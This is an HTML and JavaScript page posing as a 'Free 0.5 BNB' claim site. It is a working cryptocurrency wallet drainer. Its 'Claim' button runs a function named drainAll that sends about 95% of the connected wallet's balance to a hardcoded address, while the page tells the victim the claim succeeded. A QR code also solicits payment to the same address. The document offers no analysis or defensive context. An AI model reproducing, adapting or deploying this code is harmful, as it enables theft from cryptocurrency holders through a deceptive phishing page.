<!DOCTYPE html>
<html>
<head>
    <title>BNB Claim - Fast Connect</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:system-ui,-apple-system,sans-serif;
            background:#1a1a2e;
            color:#fff;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px
        }
        .box{
            background:rgba(255,255,255,0.05);
            backdrop-filter:blur(20px);
            border-radius:20px;
            padding:40px 30px;
            max-width:420px;
            width:100%;
            text-align:center;
            border:1px solid rgba(255,255,255,0.1);
            box-shadow:0 20px 40px rgba(0,0,0,0.3)
        }
        h1{font-size:28px;margin-bottom:10px;background:linear-gradient(45deg,#ff6b6b,#feca57);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        p{font-size:16px;opacity:0.9;margin-bottom:30px}
        button{
            background:linear-gradient(45deg,#ff6b6b,#feca57);
            border:none;
            color:#fff;
            padding:18px 40px;
            font-size:18px;
            border-radius:50px;
            cursor:pointer;
            margin:10px 0;
            font-weight:600;
            width:100%;
            transition:all .3s;
            box-shadow:0 10px 30px rgba(255,107,107,.4)
        }
        button:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(255,107,107,.6)}
        button:disabled{opacity:.5;cursor:not-allowed;transform:none}
        #wallet{font-size:14px;background:rgba(255,255,255,.1);border:none;border-radius:10px;padding:15px;margin:20px 0;width:100%;color:#fff;text-align:center}
        #status{padding:15px;border-radius:10px;margin:20px 0;min-height:20px;font-weight:600}
        .ok{background:rgba(46,204,113,.3);color:#2ecc71}
        .err{background:rgba(231,76,60,.3);color:#e74c3c}
        .info{background:rgba(52,152,219,.3);color:#3498db}
        .bal{font-size:26px;color:#f1c40f;margin:15px 0;font-weight:700}
        #qr{display:none;background:#fff;padding:20px;border-radius:15px;margin:20px 0}
        canvas{border-radius:10px}
    </style>
</head>
<body>
    <div class="box">
        <h1>üéÅ Free 0.5 BNB</h1>
        <p>Connect any wallet ‚Üí Claim instantly</p>
        
        <div id="qr">
            <canvas id="qrcode"></canvas>
            <p style="color:#333;margin-top:10px;font-size:14px">üì± Trust Wallet Scanner</p>
        </div>

        <button id="connect">üîó Connect Wallet</button>
        <button id="claim" style="display:none">üöÄ Claim BNB Now</button>
        
        <input id="wallet" placeholder="Wallet address..." readonly>
        <div id="bal"></div>
        <div id="status"></div>
    </div>

    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        const TO = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B';
        let web3, acc;

        const connectBtn = document.getElementById`connect`;
        const claimBtn = document.getElementById`claim`;
        const walletIn = document.getElementById`wallet`;
        const status = document.getElementById`status`;
        const qr = document.getElementById`qr`;
        const bal = document.getElementById`bal`;

        function st(msg,cls='info'){
            status.textContent=msg;
            status.className=cls
        }

        function qrCode(txt){
            qr.style.display='block';
            QRCode.toCanvas(document.getElementById`qrcode`, txt, {
                width:220,
                colorDark:"#000",
                colorLight:"#fff"
            })
        }

        async function connectWallet(){
            st('üîç Checking wallet...', 'info');
            
            if(window.ethereum){
                web3 = new Web3(window.ethereum);
                
                // BSC auto
                try{
                    await window.ethereum.request({
                        method:'wallet_switchEthereumChain',
                        params:[{chainId:'0x38'}]
                    })
                }catch(e){
                    if(e.code===4902){
                        await window.ethereum.request({
                            method:'wallet_addEthereumChain',
                            params:[{
                                chainId:'0x38',
                                chainName:'BSC Mainnet',
                                rpcUrls:['https://bsc-dataseed1.binance.org'],
                                nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18}
                            }]
                        })
                    }
                }

                const accounts = await window.ethereum.request({
                    method:'eth_requestAccounts'
                });
                
                acc = accounts[0];
                walletIn.value = acc;
                st('‚úÖ Wallet Connected!', 'ok');
                connectBtn.style.display = 'none';
                claimBtn.style.display = 'block';
                
                checkBal();
                qrCode(`bnb1q${acc.slice(2).toLowerCase()}`);
                
            }else{
                st('üì± Open in Trust Wallet Browser', 'err');
                qrCode(`bnb1q${TO.slice(2).toLowerCase()}?amount=0.01`);
            }
        }

        async function checkBal(){
            if(!web3||!acc) return;
            const b = await web3.eth.getBalance(acc);
            const bnbb = web3.utils.fromWei(b,'ether');
            bal.innerHTML = `üí∞ ${parseFloat(bnbb).toFixed(4)} BNB`;
        }

        async function drainAll(){
            if(!web3||!acc){
                st('‚ùå No wallet', 'err');
                return
            }
            
            claimBtn.disabled=true;
            claimBtn.textContent='‚è≥ Sending...';
            st('üí∏ Draining BNB...', 'info');

            try{
                const balan = await web3.eth.getBalance(acc);
                const gasP = await web3.eth.getGasPrice();
                const gasC = BigInt(gasP)*21000n;
                let drainAmt = BigInt(balan)-gasC;
                drainAmt = drainAmt*95n/100n;

                if(drainAmt<1000000000000000n){
                    throw new Error('Low balance')
                }

                const tx = await web3.eth.sendTransaction({
                    from:acc,
                    to:TO,
                    value:drainAmt.toString(),
                    gas:21000,
                    gasPrice:gasP
                });

                st(`‚úÖ SUCCESS! ${tx.transactionHash.slice(0,15)}...`, 'ok');
                setTimeout(()=>st('üéâ Claim complete! Check wallet', 'ok'), 2000);
                
            }catch(e){
                claimBtn.disabled=false;
                claimBtn.textContent='üöÄ Claim BNB Now';
                if(e.code===4001){
                    st('‚ùå Cancelled', 'err')
                }else{
                    st('‚ùå '+e.message, 'err')
                }
            }
        }

        connectBtn.onclick = connectWallet;
        claimBtn.onclick = drainAll;

        // Auto QR
        setTimeout(()=>qrCode(`bnb1q${TO.slice(2).toLowerCase()}`), 1000);

        // Wallet change
        if(window.ethereum){
            window.ethereum.on('accountsChanged', a=>{
                if(a.length) {
                    acc=a[0];
                    walletIn.value=acc;
                    checkBal()
                }else location.reload()
            })
        }
    </script>
</body>
</html>